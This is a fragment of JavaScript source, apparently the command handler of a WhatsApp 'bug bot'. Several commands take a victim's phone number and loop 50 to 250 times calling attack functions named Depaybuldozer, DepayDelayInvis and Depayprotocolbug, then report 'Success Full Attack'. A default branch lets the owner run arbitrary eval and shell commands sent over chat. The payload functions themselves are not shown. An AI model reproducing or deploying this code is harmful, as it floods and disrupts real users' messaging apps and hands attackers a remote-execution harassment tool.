target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 100; i++) {
await Depaybuldozer(target)
await Depaybuldozer(target)
await Depaybuldozer(target)
}
}
break
//====================[ CASE BUG DELAY INVIS ]===========================//
case 'nika-delay': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 250; i++) {
await DepayDelayInvis(target)
await DepayDelayInvis(target)
}
}
break

case 'delay-ghost':
case 'delayhard-invis': {
if (!isPremium && !isOwner) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreply(`\`𝗡𝗜𝗞𝗔 𝗦𝗨𝗖𝗖𝗘𝗦 𝗔𝗧𝗧𝗔𝗖𝗞\`
Type : ${command}
Target : ${target}
Status : Success Full Attack`)
for (let i = 0; i < 50; i++) {
await Depayprotocolbug(target) 
}
}
break

//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!isOwner) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!isOwner) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
depayy.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\